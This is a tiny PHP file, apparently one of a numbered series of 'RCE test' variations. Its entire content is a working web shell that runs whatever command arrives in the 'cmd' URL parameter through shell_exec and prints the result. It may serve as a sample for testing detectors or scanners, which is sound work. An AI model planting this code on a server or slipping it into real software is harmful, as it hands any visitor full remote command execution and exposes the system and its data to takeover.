<?php
// RCE test variation #1158
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>